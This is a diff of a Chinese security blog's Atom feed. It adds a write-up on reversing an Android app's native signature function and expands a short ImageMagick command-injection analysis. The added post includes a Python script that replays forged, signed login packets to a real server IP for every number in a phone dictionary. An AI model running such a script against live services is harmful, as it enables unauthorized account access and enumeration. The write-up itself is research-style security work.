@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://xdxd.love/"/>
-  <updated>2016-05-06T02:28:21.000Z</updated>
+  <updated>2016-05-12T06:18:46.000Z</updated>
   <id>http://xdxd.love/</id>
   
   <author>
@@ -15,14 +15,190 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title><![CDATA[一次破解apk通信签名进行漏洞挖掘的记录]]></title>
+    <link href="http://xdxd.love/2016/05/10/%E4%B8%80%E6%AC%A1%E7%A0%B4%E8%A7%A3apk%E9%80%9A%E4%BF%A1%E7%AD%BE%E5%90%8D%E8%BF%9B%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84%E8%AE%B0%E5%BD%95/"/>
+    <id>http://xdxd.love/2016/05/10/一次破解apk通信签名进行漏洞挖掘的记录/</id>
+    <published>2016-05-10T07:58:23.000Z</published>
+    <updated>2016-05-12T06:18:46.000Z</updated>
+    <content type="html"><![CDATA[<h1 id="背景">背景</h1><p>相对一个app的登录接口进行安全性分析，使用burpsuite无法抓到通信包。但是可以看到app已经成功和服务器通信了。猜测没有使用http协议，而是使用了其他协议。</p>
+<h1 id="协议分析">协议分析</h1><p>使用wireshark抓包分析。发现使用了服务器的30001端口通信。<br><img src="/images/apkqianming1.png" alt=""><br><img src="/images/apkqianming2.png" alt=""><br><img src="/images/apkqianming3.png" alt=""><br>可以看到用户名，密码，以及时间戳。尝试截止重放这个包。发现提示时间不对，应该是验证了时间戳。</p>
+<h1 id="apk逆向分析">apk逆向分析</h1><p>反编译apk。搜索关键字，定位到如下代码：</p>
+<pre><code>String valueOf = String.valueOf(System.currentTimeMillis())<span class="comment">;</span>
+       newBuilder.f(valueOf)<span class="comment">;</span>
+       newBuilder.g(Token.getSignature(valueOf.getBytes(Charset.forName(HTTP.UTF_8))))<span class="comment">;</span>
+       return newBuilder<span class="comment">;</span>
+</code></pre><p>通过观察协议数据包，一直数据包中有时间戳，而这个getSignature是对System.currentTimeMillis()进行了签名，拼接到了请求中。猜测这个函数是最终的签名函数，跟进getSignature。</p>
+<pre><code><span class="keyword">package</span> com.fangdd.app.utils;
+
+<span class="keyword">import</span> com.fangdd.app.ui.widget.ao;
+<span class="keyword">import</span> java.security.Key;
+<span class="keyword">import</span> java.security.MessageDigest;
+<span class="keyword">import</span> javax.crypto.Mac;
+<span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;
+
+<span class="keyword">public</span> class Token {
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">String</span> getSignature(<span class="built_in">byte</span>[] bArr);
+
+    <span class="keyword">static</span> {
+        System.loadLibrary(<span class="string">"fddutils"</span>);
+    }
+
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] encodeHmacSha1(<span class="built_in">byte</span>[] bArr, <span class="built_in">byte</span>[] bArr2) {
+        <span class="built_in">char</span>[] cArr = <span class="keyword">new</span> <span class="built_in">char</span>[]{<span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>};
+        StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();
+        <span class="keyword">try</span> {
+            Key secretKeySpec = <span class="keyword">new</span> SecretKeySpec(bArr2, <span class="string">"HmacSHA1"</span>);
+            Mac instance = Mac.getInstance(<span class="string">"HmacSHA1"</span>);
+            instance.init(secretKeySpec);
+            <span class="keyword">for</span> (<span class="built_in">byte</span> b : instance.doFinal(bArr)) {
+                stringBuilder.<span class="built_in">append</span>(<span class="keyword">new</span> <span class="built_in">char</span>[]{cArr[(b &gt;&gt;&gt; <span class="number">4</span>) &amp; <span class="number">15</span>], cArr[b &amp; <span class="number">15</span>]});
+            }
+            <span class="keyword">return</span> stringBuilder.toString().getBytes(<span class="string">"UTF-8"</span>);
+        } <span class="keyword">catch</span> (Exception e) {
+            System.err.<span class="built_in">println</span>(<span class="string">"encodeHmacSha1 error,message = invalid key, key = {}"</span> + bArr2.toString());
+            <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">0</span>];
+        }
+    }
+
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">String</span> encodeSha1(<span class="keyword">String</span> <span class="built_in">str</span>) {
+        <span class="built_in">int</span> i = <span class="number">0</span>;
+        <span class="keyword">try</span> {
+            MessageDigest instance = MessageDigest.getInstance(<span class="string">"SHA"</span>);
+            instance.update(<span class="built_in">str</span>.getBytes());
+            <span class="built_in">byte</span>[] digest = instance.digest();
+            StringBuffer stringBuffer = <span class="keyword">new</span> StringBuffer();
+            <span class="keyword">for</span> (<span class="built_in">byte</span> b : digest) {
+                stringBuffer.<span class="built_in">append</span>(Integer.toString((b &amp; ao.b) + <span class="number">256</span>, <span class="number">16</span>).substring(<span class="number">1</span>));
+            }
+            StringBuffer stringBuffer2 = <span class="keyword">new</span> StringBuffer();
+            <span class="keyword">while</span> (i &lt; digest.length) {
+                <span class="keyword">String</span> toHexString = Integer.toHexString(digest[i] &amp; ao.b);
+                <span class="keyword">if</span> (toHexString.length() == <span class="number">1</span>) {
+                    stringBuffer2.<span class="built_in">append</span>(<span class="string">'0'</span>);
+                }
+                stringBuffer2.<span class="built_in">append</span>(toHexString);
+                i++;
+            }
+            <span class="keyword">return</span> stringBuffer2.toString();
+        } <span class="keyword">catch</span> (Exception e) {
+            e.printStackTrace(System.err);
+            <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">String</span>();
+        }
+    }
+}
+</code></pre><p>发现调用的是so中的函数。</p>
+<h1 id="smali插桩定位关键函数">smali插桩定位关键函数</h1><p>采用<a href="http://www.52pojie.cn/thread-255754-1-1.html" target="_blank" rel="external">Smali注入之打造属于自己的安卓crack利器</a></p>
+<pre><code><span class="keyword">.class</span><span class="keyword"> public</span> <span class="class">Lcrack;</span>
+<span class="keyword">.super</span> <span class="class">Ljava/lang/Object;</span>
+<span class="keyword">.source</span> <span class="string">"crack.java"</span>
+
+<span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> static</span><span class="function"> log(</span><span class="class">Ljava/lang/String;</span><span class="function">)</span>V
+<span class="keyword">    .locals</span> 1
+<span class="keyword">    .prologue</span>
+
+   <span class="instruction"> const-string </span><span class="variable">v0</span>, <span class="string">"info"</span>
+   <span class="instruction"> invoke-static </span>{<span class="variable">v0</span>, <span class="variable">p0</span>}, <span class="class">Landroid/util/Log;</span><span class="function">-&gt;d(</span><span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span><span class="function">)</span>I
+   <span class="instruction"> return-void
+</span><span class="keyword">.end method</span>
+</code></pre><p>打印getsignature的值和抓包对比。</p>
+<pre><code>invoke-static {<span class="variable">v1</span>}, <span class="class">Lcom/fangdd/app/utils/Token;</span><span class="function">-&gt;getSignature(</span><span class="keyword">[</span>B<span class="function">)</span><span class="class">Ljava/lang/String;</span><span class="instruction">
+move-result-object </span><span class="variable">v1</span>
+<span class="instruction">
+invoke-static </span>{<span class="variable">v1</span>}, <span class="class">Lcrack;</span><span class="function">-&gt;log(</span><span class="class">Ljava/lang/String;</span><span class="function">)</span>V
+</code></pre><p>发现确实是getSignature作为签名函数。</p>
+<p><img src="/images/apkqianming4.png" alt=""></p>
+<h1 id="编写apk调用so">编写apk调用so</h1><p>使用androidstudio作为ide，在src/main目录下新建jniLibs/armeabi文件夹，将so文件放在该文件夹下面。具体详细的过程可以参考<a href="http://seniorzhai.github.io/2015/02/13/AndroidStudio%E8%B0%83%E7%94%A8so%E6%96%87%E4%BB%B6/" target="_blank" rel="external">AndroidStudio调用so文件</a>。按照以前apk的中包名，新建一模一样的包。详细的测试代码见附件。测试调用getSignature方法：</p>
+<pre><code>public <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword"><span class="keyword">extends</span></span> <span class="title">ActionBarActivity</span> {</span>
+
+    <span class="annotation">@Override</span>
+    <span class="keyword">protected</span> void onCreate(<span class="type">Bundle</span> savedInstanceState) {
+        <span class="keyword">super</span>.onCreate(savedInstanceState);
+        setContentView(<span class="type">R</span>.layout.activity_main);
+        <span class="type">String</span> <span class="class"><span class="keyword">object</span>;</span>
+        <span class="class"><span class="keyword">object</span> =</span> <span class="type">String</span>.valueOf(<span class="type">System</span>.currentTimeMillis());
+        <span class="type">Token</span>.getSignature((byte[])<span class="class"><span class="keyword">object</span>.<span class="title">getBytes</span>(</span><span class="type">Charset</span>.forName(<span class="string">"UTF-8"</span>)));
+        <span class="type">Log</span>.d(<span class="string">"111time"</span>,<span class="class"><span class="keyword">object</span>);</span>
+        <span class="type">Log</span>.d(<span class="string">"111"</span>,<span class="type">Token</span>.getSignature((byte[])<span class="class"><span class="keyword">object</span>.<span class="title">getBytes</span>(</span><span class="type">Charset</span>.forName(<span class="string">"UTF-8"</span>))));
+        <span class="type">System</span>.out.println(<span class="string">"test"</span>);
+    }
+</code></pre><p>查看logcat输出。</p>
+<p><img src="/images/apkqianming5.png" alt=""></p>
+<p>获得时间戳和时间戳的签名。采用以下脚本测试：</p>
+<pre><code><span class="comment">#!/usr/bin/env python</span>
+
+<span class="keyword">import</span> socket
+<span class="keyword">import</span> struct
+<span class="keyword">import</span> time
+
+
+
+<span class="function"><span class="keyword">def</span> <span class="title">h2bin</span><span class="params">(x)</span>:</span>
+    <span class="keyword">return</span> x.replace(<span class="string">' '</span>, <span class="string">''</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>).decode(<span class="string">'hex'</span>)
+
+denglu1 = h2bin(<span class="string">''' c8 01 08 05 10 00 30 02  3a 05 34 2e 34 2e 34 42 
+ 24 48 54 43 20 4f 6e 65  20 2d 20 34 2e 34 2e 34 
+ 20 2d 20 41 50 49 20 31  39 20 2d 20 31 30 38 30 
+ 78 31 39 32 30 48 17 52  03 36 2e 34 7a 3b 08 02 
+ 12 37 0a 0b '''</span>)
+
+denglu2 = h2bin(<span class="string">''' 12 
+ 06 31 32 33 34 35 36 5a  20 64 61 64 64 61 37 65 
+ 66 32 30 34 37 33 36 38  33 61 38 34 65 61 34 31 
+ 65 65 61 31 61 38 61 30  31 8a 01 03 66 64 64 a2 
+ 01 0d '''</span>)
+
+denglu3 = h2bin(<span class="string">''' aa 
+ 01 38 4d 54 45 33 5a 6d  46 68 4d 6d 49 78 4e 57 
+ 45 7a 4e 57 59 31 4d 7a  63 78 4e 47 51 77 4d 44 
+ 55 32 59 57 4e 6d 5a 44  6c 6b 5a 54 42 68 4f 44 
+ 63 32 4e 57 49 34 4e 67  3d 3d                          
+'''</span>)
+
+denglu4 = h2bin(<span class="string">'''aa 
+ 01 38 '''</span>)
+HOST=<span class="string">'103.235.228.10'</span>
+PORT=<span class="number">30001</span>
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((HOST,PORT))
+
+phonefile = open(<span class="string">'/Users/security/dict/13Wphone.txt'</span>)
+<span class="keyword">for</span> phone <span class="keyword">in</span> phonefile:
+    <span class="comment"># denglu = denglu1+struct.pack('11s',phone)+denglu2+struct.pack('13s',str(int(time.time()*1000)))+denglu3</span>
+    denglu = denglu1+struct.pack(<span class="string">'11s'</span>,phone) +denglu2+<span class="string">'1463032691831'</span>+denglu4 +<span class="string">'MTQzMmUyYTYwMjFmNGU2ODM5YWM2MDQwOTdkZWFkNDY3NzdkZGY2Yw=='</span>
+    <span class="keyword">print</span> <span class="string">'connected'</span>
+    s.sendall(denglu)
+    <span class="keyword">print</span> <span class="string">'sendall'</span>
+    data=s.recv(<span class="number">1024</span>)
+    <span class="keyword">print</span> data
+    <span class="comment"># print phone</span>
+<span class="comment"># print denglu</span>
+s.close()
+</code></pre><p>发现可以成功调用登录接口。</p>
+<h1 id="编写poc">编写poc</h1><h1 id="参考资料">参考资料</h1><p><a href="http://drops.wooyun.org/tips/2871" target="_blank" rel="external">http://drops.wooyun.org/tips/2871</a><br><a href="http://drops.wooyun.org/tips/2986" target="_blank" rel="external">http://drops.wooyun.org/tips/2986</a><br><a href="http://www.52pojie.cn/thread-255754-1-1.html" target="_blank" rel="external">http://www.52pojie.cn/thread-255754-1-1.html</a></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<h1 id="背景">背景</h1><p>相对一个app的登录接口进行安全性分析，使用burpsuite无法抓到通信包。但是可以看到app已经成功和服务器通信了。猜测没有使用http协议，而是使用了其他协议。</p>
+<h1 id="协议分析">协议分析</h1><p>使用wi]]>
+    </summary>
+    
+      <category term="签名逆向" scheme="http://xdxd.love/tags/%E7%AD%BE%E5%90%8D%E9%80%86%E5%90%91/"/>
+    
+      <category term="移动安全" scheme="http://xdxd.love/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
     <title><![CDATA[imagemagic RCE漏洞分析与利用]]></title>
     <link href="http://xdxd.love/2016/05/05/imagemagic-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
     <id>http://xdxd.love/2016/05/05/imagemagic-RCE漏洞分析与利用/</id>
     <published>2016-05-05T08:20:21.000Z</published>
-    <updated>2016-05-06T02:28:21.000Z</updated>
-    <content type="html"><![CDATA[<h1 id="漏洞原理">漏洞原理</h1><h1 id="代码分析">代码分析</h1>]]></content>
+    <updated>2016-05-09T02:58:04.000Z</updated>
+    <content type="html"><![CDATA[<h1 id="漏洞原理">漏洞原理</h1><p>目前的分析讲的比较清楚了。概括来讲imagemagic允许使用外部库处理图片。这个特性叫做delegate。通过使用system()调用命令行来实现的。命令预先配置在delegates.xml中。接受输入图片参数再完成最后的命令拼接。就是拼接命令的过程，出现了命令注入的漏洞。</p>
+<h1 id="代码分析">代码分析</h1><p>使用正常png图片执行命令。</p>
+<h1 id="参考资料">参考资料</h1><p><a href="https://imagetragick.com/" target="_blank" rel="external">https://imagetragick.com/</a><br><a href="http://drops.wooyun.org/papers/15589" target="_blank" rel="external">http://drops.wooyun.org/papers/15589</a><br><a href="http://360adlab.com/?p=1895" target="_blank" rel="external">http://360adlab.com/?p=1895</a><br><a href="http://ricterz.me/posts/Write%20Up%3A%20Remote%20Command%20Execute%20in%20Wordpress%204.5.1" target="_blank" rel="external">http://ricterz.me/posts/Write%20Up%3A%20Remote%20Command%20Execute%20in%20Wordpress%204.5.1</a><br><a href="https://github.com/ImageTragick/PoCs" target="_blank" rel="external">https://github.com/ImageTragick/PoCs</a><br><a href="http://weibo.com/p/1001603971443670055277" target="_blank" rel="external">http://weibo.com/p/1001603971443670055277</a></p>
+]]></content>
     <summary type="html">
-    <![CDATA[<h1 id="漏洞原理">漏洞原理</h1><h1 id="代码分析">代码分析</h1>]]>
+    <![CDATA[<h1 id="漏洞原理">漏洞原理</h1><p>目前的分析讲的比较清楚了。概括来讲imagemagic允许使用外部库处理图片。这个特性叫做delegate。通过使用system()调用命令行来实现的。命令预先配置在delegates.xml中。接受输入图片参数再完成最后的命令]]>
     </summary>
     
       <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
@@ -861,46 +1037,6 @@ select_expr [, select_expr ...]
     </summary>
     
       <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[centos 6安装mitmproxy]]></title>
-    <link href="http://xdxd.love/2016/02/26/centos-6%E5%AE%89%E8%A3%85mitmproxy/"/>
-    <id>http://xdxd.love/2016/02/26/centos-6安装mitmproxy/</id>
-    <published>2016-02-26T07:18:01.000Z</published>
-    <updated>2016-03-02T07:07:45.000Z</updated>
-    <content type="html"><![CDATA[<p><img src="/source/mitmproxy1.png" alt=""></p>
-<p>mitmproxy是一款支持HTTP(S)的中间人代理工具。不同于Fiddler2，burpsuite等类似功能工具，mitmproxy可在终端下运行。mitmproxy使用Python开发，是辅助web开发&amp;测试，移动端调试，渗透测试的工具。</p>
-<p>mitmproxy作为定制化工具开发比较方便。但是mitmproxy需要太多依赖了。在mac上使用编译好的执行程序还是比较方便，ubuntu按照官方说明也比较方便安装。</p>
-<p>ubuntu上安装命令如下：</p>
-<pre><code>$ sudo apt-<span class="built_in">get</span> install python-pip python-<span class="built_in">dev</span> libffi-<span class="built_in">dev</span> libssl-<span class="built_in">dev</span> libxml2-<span class="built_in">dev</span> libxslt1-<span class="built_in">dev</span>
-$ sudo pip install mitmproxy
-</code></pre><p>mitmproxy官方没有在centos上的安装说明。在centos6.7上安装失败多次，最后按照<a href="http://pacess.blogspot.com/2014/11/install-mitmproxy-on-centos.html" target="_blank" rel="external">在 CentOS 下安裝 mitmproxy</a>的说明，安装成功。</p>
-<pre><code>試過幾次失敗後，最終都能成功安裝在 CentOS <span class="number">6</span>。問題是出在 Python <span class="number">2.6</span> 及 Python <span class="number">3.4</span>。原來「mitmproxy」在 Python <span class="number">2.7</span> 才能順利安裝。要是使用 CentOS <span class="number">7</span> 的話，隨機附送的就是 Python <span class="number">2.7</span>。安裝「mitmproxy」的步驟如下：
-<span class="number">1.</span> 下載 Python 的 PIP 工具
-    wget https:<span class="comment">//bootstrap.pypa.io/get-pip.py</span>
-<span class="number">2.</span> 安裝 Python <span class="number">2.7</span> 的 PIP
-    python get-pip.py
-<span class="number">3.</span> 下載 Python 的 EZ Setup
-    wget https:<span class="comment">//bitbucket.org/pypa/setuptools/raw/bootstrap/ez_setup.py</span>
-<span class="number">4.</span> 安裝 Python <span class="number">2.7</span> 的 EZ Setup
-    python ez_setup.py
-<span class="number">5.</span> 安裝需要的封包
-    yum -y install python-pyasn1 python-flask python-urwid readline-devel gdbm-devel bzip2-devel ncurses-devel sqlite-devel tk-devel gcc python-setuptools python-pip python27-pip newt-python python-devel python27-devel python-pyasn1 pyOpenSSL gcc libxml2-devel libxslt-devel libffi-devel openssl-devel
-<span class="number">6.</span> 安裝 pyOpenSSL <span class="number">0.14</span>
-    easy_install http:<span class="comment">//pypi.python.org/packages/source/p/pyOpenSSL/pyOpenSSL-0.12.tar.gz</span>
-</code></pre><p>最后 pip install mitmporxy 就好。</p>
-<p><img src="/images/mitmproxy1.JPG" alt=""></p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p><img src="/source/mitmproxy1.png" alt=""></p>
-<p>mitmproxy是一款支持HTTP(S)的中间人代理工具。不同于Fiddler2，burpsuite等类似功能工具，mitmproxy可在终端下运行。mitmproxy使用P]]>
-    </summary>
-    
-      <category term="mitmproxy" scheme="http://xdxd.love/tags/mitmproxy/"/>
-    
-      <category term="折腾不止" scheme="http://xdxd.love/categories/%E6%8A%98%E8%85%BE%E4%B8%8D%E6%AD%A2/"/>
     
   </entry>
   
